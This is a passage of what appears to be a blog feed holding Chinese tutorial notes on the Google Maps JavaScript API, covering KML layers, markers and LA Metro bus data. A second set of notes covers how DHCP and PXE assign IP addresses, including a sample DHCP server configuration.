class="string">&#x27;kass&#x27;</span>)</span><br></pre></td></tr></table></figure><p>2.3 <strong>在谷歌地球中创建内容，并将其带入google地图</strong></p><ul><li>在Google地球编辑图层</li><li>图层导出为 KMZ 文件，上传到网站空间，使其可通过链接引用</li><li>使用 KMZ 链接<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var UCLAparking;</span><br><span class="line">UCLAParking=<span class="keyword">new</span> google.maps.<span class="constructor">KmlLayer(&#x27;<span class="params">http</span>:<span class="operator">/</span><span class="operator">/</span><span class="params">domain</span>.<span class="params">com</span><span class="operator">/</span><span class="params">kml</span><span class="operator">/</span>UCLAParking.<span class="params">kmz</span>?<span class="params">dummy</span>=&#x27;+(<span class="params">new</span> Date()</span>).get<span class="constructor">Time()</span>);</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">UCLAParking</span>.</span></span>set<span class="constructor">Map(<span class="params">map</span>)</span>;</span><br><span class="line"><span class="comment">// dummy 参数的作用</span></span><br><span class="line"><span class="comment">// 当你加载一次kml,google会缓存kml，当你下载请求时会自动加载缓存而不是最新的kml文件</span></span><br><span class="line"><span class="comment">//所以在URL上添加一个伪参数 dummy，确保 URL 唯一。</span></span><br></pre></td></tr></table></figure></li></ul><p>2.4  <strong>CSS:布局方案</strong></p><ul><li>固定地图大小  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-attr">[style=<span class="string">&#x27;width:800;margin:auto&#x27;</span>]</span></span><br><span class="line">    <span class="selector-tag">h1</span>&#123;<span class="selector-tag">UCLA</span> <span class="selector-tag">Parking</span> <span class="selector-tag">Structures</span>&#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-id">#map_canvas</span><span class="selector-attr">[style=width:800px;height:600px]</span></span><br><span class="line">    <span class="selector-tag">div</span>&#123;<span class="selector-tag">Welcome</span>！.........&#125;</span><br></pre></td></tr></table></figure>  <img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g1a8rbzdtnj307u061jsz.jpg" alt="img"></li><li>2列布局  <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div[style=position:absolute;width:<span class="number">230</span>px;height:<span class="number">100</span>%;overflow:<span class="keyword">auto</span>;<span class="keyword">float</span>:left;padding-left:<span class="number">10</span>px;padding-right:<span class="number">10</span>px;]</span><br><span class="line">    h1&#123;UCLA Parking Structures</span><br><span class="line">div#map_canvas[style=height:<span class="number">100</span>%;margin-left:<span class="number">250</span>px]</span><br></pre></td></tr></table></figure></li></ul><p>3.01 <strong>Infowindows</strong><br>实现一次只打开一个窗口</p><ul><li>原来的代码:create_marker,create_infowindow,bind_marker-infowindow<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">var</span> yoh=&#123;&#125;;</span><br><span class="line">yoh.createMarker=function()&#123;</span><br><span class="line">    <span class="built_in">var</span> markerLatLng=<span class="built_in">new</span> google.maps.LatLng(latitude,longitude);</span><br><span class="line">    <span class="built_in">var</span> marker=<span class="built_in">new</span> google.<span class="built_in">map</span>.Marker(&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">position</span>:markerLatLng,</span><br><span class="line">        <span class="built_in">map</span>:<span class="built_in">map</span>,</span><br><span class="line">        <span class="built_in">title</span>:<span class="built_in">title</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">var</span> infowindow = <span class="built_in">new</span> google.maps.InfoWindow(&#123;</span><br><span class="line">        <span class="built_in">content</span>:contentString</span><br><span class="line">    &#125;);</span><br><span class="line">    google.maps.event.addListener(marker,&#x27;click&#x27;,funciton()&#123;</span><br><span class="line">       infowindow.open(<span class="built_in">map</span>,marker); </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>更改后的代码<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">var</span> yoh=&#123;&#125;;</span><br><span class="line"><span class="built_in">var</span> infowindow=<span class="built_in">new</span> google.maps.InfoWindow();</span><br><span class="line"></span><br><span class="line">yoh.createMarker=function(latitude,longitude,<span class="built_in">title</span>,contentString)&#123;</span><br><span class="line">    <span class="built_in">var</span> markerLatLng = <span class="built_in">new</span> google.maps.LatLng(latitude,longitude);</span><br><span class="line"><span class="built_in">var</span> marker = <span class="built_in">new</span> google.maps.Marker(&#123;</span><br><span class="line"><span class="built_in">position</span>: markerLatLng,</span><br><span class="line"><span class="built_in">map</span>: <span class="built_in">map</span>,</span><br><span class="line"><span class="built_in">title</span>: <span class="built_in">title</span></span><br><span class="line">&#125;);</span><br><span class="line">google.maps.event.addListener(marker, &#x27;click&#x27;, function() &#123;</span><br><span class="line">infowindow.setContent(contentString);</span><br><span class="line">infowindow.open(<span class="built_in">map</span>,marker);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>3.02 <strong>KML 是否指定缩放级别与位置</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Google Maps API 再添加 kml 图层后，默认自动缩放到 kml 对象的范围。(而不是指定的缩放级别和经纬度)</span></span><br><span class="line">var myKML;</span><br><span class="line">myKML=<span class="keyword">new</span> google.maps.<span class="constructor">KmlLayer(&#x27;<span class="params">http</span>:<span class="operator">/</span><span class="operator">/</span><span class="params">domain</span><span class="operator">/</span><span class="params">kml</span><span class="operator">/</span><span class="params">damage</span>.<span class="params">kmz</span>&#x27;,&#123;<span class="params">preserveViewport</span>:<span class="params">true</span>&#125;)</span>;</span><br><span class="line">myKML.set<span class="constructor">Map(<span class="params">map</span>)</span>;</span><br></pre></td></tr></table></figure><p>3.2 <strong>Metro Web - Using jQuery to display route data</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>developer.metro.net/</span><br><span class="line">http:<span class="regexp">//</span>api.metro.net<span class="regexp">/agencies/</span>lametro/routes?callback=?</span><br><span class="line"><span class="comment">#数据格式  路线的？</span></span><br><span class="line">&#123;<span class="string">&quot;items&quot;</span>:[&#123;<span class="string">&quot;dispaly_name&quot;</span>:<span class="string">&quot;name?&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="number">2</span>&#125;,&#123;<span class="string">&quot;display_name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;id&quot;</span>:&#125;,&#123;,&#125;,...]&#125;</span><br></pre></td></tr></table></figure><ul><li>通过JSONP请求<strong>获取数据</strong><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加在全局函数中</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trace</span>(<span class="params">message</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(message);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 添加在初始化函数中</span></span><br><span class="line">yoh.getBusRoutes = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.getJSON(<span class="string">&quot;http://api.metro.net/agencies/lametro/routes?callback=?&quot;</span>,<span class="function"><span class="title">functon</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        trace(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>遍历取出数据<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//更改函数</span></span><br><span class="line">getBusRoutes</span><br><span class="line">    $.getJSON(<span class="string">&quot;http://api.metro.net/agencies/lametro/routes?callback=?&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        $.each(data.items,<span class="function"><span class="keyword">function</span>(<span class="params">i,item</span>)</span>&#123;</span><br><span class="line">            trace(item.display_name);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>展示在左侧框<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//左侧添加 DIV 元素</span></span><br><span class="line">div#stoplist</span><br><span class="line"><span class="comment">//更改函数</span></span><br><span class="line">getBusRoutes</span><br><span class="line">    getJSON,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        <span class="title">$</span>.<span class="title">each</span>(<span class="params">data,items,<span class="keyword">function</span>()&#123;</span></span></span><br><span class="line"><span class="params"><span class="function">            $(<span class="string">&quot;#toplist&quot;</span>).append(item.display_name+<span class="string">&quot;&lt;/br&gt;&quot;</span>)</span></span></span><br><span class="line"><span class="params"><span class="function">        &#125;</span>)</span>;</span><br></pre></td></tr></table></figure></li></ul><p>3.3 <strong>映射公交车站位置</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>api.metro.net<span class="regexp">/agencies/</span>lametro<span class="regexp">/routes/</span><span class="number">704</span>/sequence</span><br><span class="line"><span class="comment">#数据格式</span></span><br><span class="line">&#123;items:[&#123;<span class="string">&quot;longitude&quot;</span>:<span class="number">114</span>,<span class="string">&quot;latitude&quot;</span>:<span class="number">34</span>,<span class="string">&quot;display_name&quot;</span>:<span class="string">&quot;name1&quot;</span>,id:<span class="string">&quot;&quot;</span>&#125;,&#123;&#125;,&#123;&#125;,...]&#125;</span><br></pre></td></tr></table></figure><ul><li>获取位置数据 <figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yoh.mapBusStops=<span class="keyword">function</span>(busnum)&#123;</span><br><span class="line">    $.each(data.items,<span class="keyword">function</span>(i,<span class="type">item</span>)&#123;</span><br><span class="line">      <span class="built_in"> trace</span>(i+<span class="string">&#x27;:&#x27;</span>+<span class="type">item</span>.display_name);</span><br><span class="line">      <span class="built_in"> trace</span>(<span class="type">item</span>.latitude);</span><br><span class="line">      <span class="built_in"> trace</span>(<span class="type">item</span>.longitude);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>地图上显示<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> busstop=[];  <span class="comment">//global var</span></span><br><span class="line">yoh.createStop=<span class="function"><span class="keyword">function</span>(<span class="params">i,latitude,longitude,title</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> markeLatLng=<span class="keyword">new</span> google.maps.LatLng(latitude,longitude);</span><br><span class="line">    busstop[i]=<span class="keyword">new</span> google.maps.Marker(&#123;</span><br><span class="line">        <span class="attr">position</span>:markerLatLng,</span><br><span class="line">        <span class="attr">map</span>:map,</span><br><span class="line">        <span class="attr">title</span>:title</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">yoh.mapBusStops=<span class="function"><span class="keyword">function</span>(<span class="params">busnum</span>)</span>&#123;</span><br><span class="line">    $.getJSON(<span class="string">&quot;http://api.metro.net/agencies/lametro/routes/&quot;</span>+busnum+<span class="string">&quot;/sequence?callback=?&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        $.each(data.items,<span class="function"><span class="keyword">function</span>(<span class="params">i,item</span>)</span>&#123;</span><br><span class="line">            yoh.createStop(i,item.latitude,item.longitude,item.display_name);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>3.4 <strong>自动缩放以显示公交车站位置-使用”bounds”</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">define    <span class="keyword">new</span>    extend all</span><br><span class="line">-----------</span><br><span class="line"><span class="keyword">var</span> bounds;        <span class="comment">//define</span></span><br><span class="line">yoh.mapBusStops=<span class="function"><span class="keyword">function</span>(<span class="params">busnum</span>)</span>&#123;</span><br><span class="line">    bounds = <span class="keyword">new</span> google.maps.LatLngBounds();    <span class="comment">//new bounds</span></span><br><span class="line">    $.getJSON....<span class="keyword">function</span></span><br><span class="line">        each</span><br><span class="line">            createStop()</span><br><span class="line">&#125;</span><br><span class="line">yoh.createStop=<span class="function"><span class="keyword">function</span>(<span class="params">i,latitude,longitude,title</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> markerLatLng=<span class="keyword">new</span> ;</span><br><span class="line">    bounds.extend(markerLatLng);  <span class="comment">// extend</span></span><br><span class="line">    map.fitBounds(bounds);</span><br><span class="line">    busstop[i]=</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.5 <strong>更改默认地图图标</strong></p><p><a href="http://mapicons.nicolasmollet.com/">mapicon素材</a><br>查找图标,右键保存,url引用</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">busstop[i]=<span class="built_in">new</span> google.maps.Marker(&#123;</span><br><span class="line">    <span class="built_in">position</span>:markerLatLng,</span><br><span class="line">    <span class="built_in">map</span>:<span class="built_in">map</span>,</span><br><span class="line">    <span class="built_in">title</span>:<span class="built_in">title</span>,</span><br><span class="line">    icon:&#x27;http://www.yohman.com/students/yoh/images/bus.png...&#x27;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>3.6 <strong>点击左侧链接，动态映射每条路线</strong>  </n></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">div#toplist 增加链接  yoh.mapBusstops(  )</span></span><br><span class="line"><span class="section">-----------------------</span></span><br><span class="line">$(<span class="emphasis">&#x27;#stoplist&#x27;</span>).append(<span class="emphasis">&#x27;&lt;a onclick=&quot;up206b.mapBusStops(&#x27;</span><span class="code">+item.id+</span><span class="emphasis">&#x27;)&quot; href=&quot;javascript:void(0)&quot;&gt;&#x27;</span><span class="code">+item.id+</span><span class="emphasis">&#x27;&lt;/a&gt; &#x27;</span>);</span><br></pre></td></tr></table></figure><p>3.7 <strong>removing routes</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">something.set<span class="constructor">Map(<span class="params">map</span>)</span>;  <span class="comment">//添加一些东西(标记，线，多边形，圆，KMl图层)</span></span><br><span class="line">something.set<span class="constructor">Map(<span class="params">null</span>)</span>;  <span class="comment">// 关闭一些东西</span></span><br></pre></td></tr></table></figure><p>由于点击左侧的链接，公交车站图标会一直在地图上，所以需要在每次点击前移除图标。</p><p>3.9 <strong>bus 实时</strong> </br><br>返回的json 数据为空。。。。暂停(可能因为时差问题，现在那边是深夜)<br>\n<a href="http://api.metro.net/agencies/lametro/routes/704/vehicles/">公交车数据</a></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">livebus[i] = <span class="built_in">new</span> google.maps.Marker(&#123;</span><br><span class="line">    <span class="built_in">position</span>: markerLatLng,</span><br><span class="line">    <span class="built_in">map</span>: <span class="built_in">map</span>,</span><br><span class="line">    <span class="built_in">title</span>: <span class="built_in">title</span>,</span><br><span class="line">    icon: &#x27;http://www.yohman.com/students/yoh/images/livebus.png&#x27;,</span><br><span class="line">    zIndex: <span class="number">2000</span></span><br><span class="line">&#125;);</span><br><span class="line">.......</span><br><span class="line">livebus[i]=yoh.createMarker(.....);</span><br><span class="line">livebus[i].setZIndex(<span class="number">2000</span>);</span><br></pre></td></tr></table></figure><p>用<code>$.getJSON()</code>  把返回的<code>true</code>变为<code>True</code>,导致出现异常。<br>使用<code>$.get()</code></p><p>4.1 <strong>切换图层</strong></p><ul><li>切换单个对象图层(marker,buffer,kml layer)<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">createCircle</span><br><span class="line"><span class="selector-tag">label</span>&gt;<span class="selector-tag">input</span><span class="selector-attr">[checkbox]</span>  //toggle: <span class="built_in">setmap</span>(null)  <span class="built_in">setmap</span>(map)</span><br></pre></td></tr></table></figure></li><li>切换数组中的对象(busstop)<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//Toggle an<span class="built_in"> array </span>of place marks  (mapBusStops)</span><br><span class="line"></span><br><span class="line">//Toggle an<span class="built_in"> array </span>of circles,polygons<span class="built_in"> or </span>lines</span><br><span class="line">cityCircle[]   //create  toggle  </span><br></pre></td></tr></table></figure></li></ul><p>4.3 libraries=places</p>]]></content>
      
      
      <categories>
          
          <category> WebGIS </category>
          
          <category> 教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4, DHCP与PXE：IP是怎么来的，又是怎么没的</title>
      <link href="/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/4-dhcp%E4%B8%8Epxe%EF%BC%9Aip%E6%98%AF%E6%80%8E%E4%B9%88%E6%9D%A5%E7%9A%84%EF%BC%8C%E5%8F%88%E6%98%AF%E6%80%8E%E4%B9%88%E6%B2%A1%E7%9A%84/"/>
      <url>/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/4-dhcp%E4%B8%8Epxe%EF%BC%9Aip%E6%98%AF%E6%80%8E%E4%B9%88%E6%9D%A5%E7%9A%84%EF%BC%8C%E5%8F%88%E6%98%AF%E6%80%8E%E4%B9%88%E6%B2%A1%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h4 id="如何配置IP地址"><a href="#如何配置IP地址" class="headerlink" title="如何配置IP地址"></a>如何配置IP地址</h4><ul><li>使用<code>net-tools</code>  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span> eth<span class="number">1</span> <span class="number">10.0.0.0</span>/<span class="number">24</span></span><br><span class="line"><span class="attribute">ifconfig</span> eth<span class="number">1</span> up</span><br></pre></td></tr></table></figure></li><li>使用iproute2  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip addr <span class="builtin-name">add</span> 10.0.0.1/24 dev eth1<span class="built_in"></span></span><br><span class="line"><span class="built_in">ip </span>link <span class="builtin-name">set</span> up eth1</span><br></pre></td></tr></table></figure></li><li>更改配置文件(多数情况)<ul><li>文件内容：CIDR、子网掩码、广播地址和网关地址。<span id="more"></span></li></ul></li></ul><p><strong>问题：</strong> 配置地址时，当你把 ip 地址改为与局域网内的机器不同网段，会发现ping 不通与你处于同一局域网的机器，为什么?<br>    假设你将IP地址更改为<code>15.157.*.*</code>,你要发送的及其IP地址为<code>192.168.1.6</code>,那么你会尝试获取网关的MAC地址，而根据你的IP地址，你的网关地址为<code>15.157.*.*?</code>,所以获取不到网关的MAC地址，发送失败。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A&#123;请求的ip是否处于同一网段&#125;--&gt;|<span class="type">是|B</span>(发送ARP请求获取MAC地址)</span><br><span class="line">A--&gt;|<span class="type">否|C</span>(查看是否配置网关)</span><br><span class="line">C--&gt;|<span class="type">是|D</span>(尝试获取网关的MAC地址)</span><br><span class="line">C--&gt;|<span class="type">否|E</span>(发送失败)</span><br></pre></td></tr></table></figure><h4 id="动态主机配置协议-DHCP"><a href="#动态主机配置协议-DHCP" class="headerlink" title="动态主机配置协议(DHCP)"></a>动态主机配置协议(DHCP)</h4><p>网络管理员需要配置一段共享的IP地址，接入的机器都通过<strong>DHCP</strong>从共享的IP地址里申请，就可以自动配置(用完即还？所以叫动态？)</br><br><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g138kkzf7yj30jj01c3za.jpg" alt="img"></p><h5 id="DHCP工作方式"><a href="#DHCP工作方式" class="headerlink" title="DHCP工作方式"></a>DHCP工作方式</h5><ol><li>“一声吼-DHCP Discover”：新机器加入一个网络时，先使用 IP地址 0.0.0.0 发送一个广播包，目的地址为 255.255.255.255。<ul><li>广播包封装在UDP里面，UDP封装在BOOTP里面</li><li>DHCP是BOOTP的增强版</li><li>广播包里， BOOT request(我是新来的) ，请求IP(没有IP),MAC地址(发过来)</br><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g139o4shj5j307104cwej.jpg" alt="img"></li></ul></li><li>“我给你-DHCP Server -&gt; DHCP Offer”    <ul><li>DHCP Server：  需要配置的服务内容?</li><li>DHCP Offer ：  给新机器分配一个ip的过程(并保证此ip不在分配给其他机器)<ul><li>BooT reply(给你发过去),MAC地址(你的地址)，IP(给你分配的IP),(其他：子网掩码，网关，IP地址租用期)</br><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g139og29xej307104bjrh.jpg" alt="img"></li><li>如果有多个DHCP Server，新机器会收到多个IP地址。新机器会选择其中一个DHCP Offer(一般是最先到达)，并且向网络发送一个DHCP Request 广播数据包，告诉所有DHCP Server 将接受那一台服务器提供的IP地址，请求其他DHCP服务器撤销提供的IP地址。(MAC地址(是我)，提供IP的DHCP服务器地址(要他给的)，接受的IP(这个IP))</br><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g13a1xyfgbj307304cdfx.jpg" alt="img"></li></ul></li></ul></li><li>“约定达成”<ul><li>约定达成前：客户端使用 0.0.0.0 为源地址，255.255.255.255为目标地址进行广播</li><li>直到，BOOTP里接收某个DHCP Server 分配的IP，发送DHCP request 广而告之(我选他了)</li><li>DHCP Server 接收到 DHCP request 后，会广播返回给客户机一个 <code>DHCP ACK</code> 消息包(表明接受客户机的选择)，并将IP地址的合法租用信息和其他配置信息也一起发送.</br><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g13agmsslkj30850543yr.jpg" alt="img"><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">角色：DHCP Server，客户端</span><br><span class="line"><span class="keyword">Boot </span>Request  , <span class="keyword">Boot </span>Reply</span><br><span class="line">类比：租房子，</span><br><span class="line">    <span class="number">1</span>，发布通告我要租房子</span><br><span class="line">    <span class="number">2</span>，房东都来联系你，给你地址</span><br><span class="line">    <span class="number">3</span>，你选择一个地址后，发通告给所有房东说你选好了</span><br><span class="line">    <span class="number">4</span>，被你选的房东看到了，给你发更详细的合同</span><br></pre></td></tr></table></figure>##### IP地址的收回和续约</li></ul></li></ol><ul><li>续约需要提前(打招呼)，不能到了时间再续租</li><li>一般是在租期过去50%时候，客户机会向提供IP地址的DHCP Server 发送 SHCP request消息包</li><li>客户起会收到服务器回应的 DHCP ACK 消息包，以此更新自己的配置(新的租期，更新的TCP/IP参数)</li></ul><h4 id="预启动执行环境-PXE"><a href="#预启动执行环境-PXE" class="headerlink" title="预启动执行环境(PXE)"></a>预启动执行环境(PXE)</h4><h5 id="系统启动过程："><a href="#系统启动过程：" class="headerlink" title="系统启动过程："></a>系统启动过程：</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">graph</span> <span class="selector-tag">LR</span></span><br><span class="line"><span class="selector-tag">A</span><span class="selector-attr">[启动BIOS]</span><span class="selector-tag">--</span>&gt;|读取硬盘的<span class="selector-tag">MBR</span>启动扇区|<span class="selector-tag">B</span><span class="selector-attr">[启动GRUB]</span></span><br><span class="line"><span class="selector-tag">B</span><span class="selector-tag">--</span>&gt;<span class="selector-tag">C</span><span class="selector-attr">[加载内核-根文件系统的文件]</span></span><br><span class="line"><span class="selector-tag">C--</span>&gt;<span class="selector-tag">D</span><span class="selector-attr">[内核启动,初始化系统]</span></span><br></pre></td></tr></table></figure><h5 id="预启动执行环境-Pre-boot-Execution-Envionment"><a href="#预启动执行环境-Pre-boot-Execution-Envionment" class="headerlink" title="预启动执行环境(Pre-boot Execution Envionment)"></a>预启动执行环境(Pre-boot Execution Envionment)</h5><ul><li>PXE 协议分为客户端和服务器端(客户端没有操作系统，只能先把客户端放在BIOS里)</li><li>BIOS 把<code>PXE</code>客户端调入内存里，<code>PXE</code>客户端发送DHCP请求，让<code>DHCP server</code>分配IP地址和<strong>PXE服务器地址</strong></li><li>DHCP Server 配置:可以增加PXE服务器地址(安装操作系统)</li><li>DHCP配置样例：</br><ol><li>IP地址段，子网掩码，网关地址，租期；</br></li><li>指向 PXE服务器的地址(next server)，初始启动文件 filename(会下载这个文件)<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ddns-update-style interim<span class="comment">;</span></span><br><span class="line">ignore client-updates<span class="comment">;</span></span><br><span class="line">allow booting<span class="comment">;</span></span><br><span class="line">allow bootp<span class="comment">;</span></span><br><span class="line">subnet <span class="number">192.168</span>.<span class="number">1.0</span> netmask <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">&#123;</span><br><span class="line">option routers <span class="number">192.168</span>.<span class="number">1.1</span><span class="comment">;</span></span><br><span class="line">option subnet-mask <span class="number">255.255</span>.<span class="number">255.0</span><span class="comment">;</span></span><br><span class="line">option time-offset -<span class="number">18000</span><span class="comment">;</span></span><br><span class="line">default-lease-time <span class="number">21600</span><span class="comment">;</span></span><br><span class="line">max-lease-time <span class="number">43200</span><span class="comment">;</span></span><br><span class="line">range dynamic-bootp <span class="number">192.168</span>.<span class="number">1.240</span> <span class="number">192.168</span>.<span class="number">1.250</span><span class="comment">;</span></span><br><span class="line">filename <span class="string">&quot;pxelinux.0&quot;</span><span class="comment">;</span></span><br><span class="line">next-server <span class="number">192.168</span>.<span class="number">1.180</span><span class="comment">;</span></span><br><span 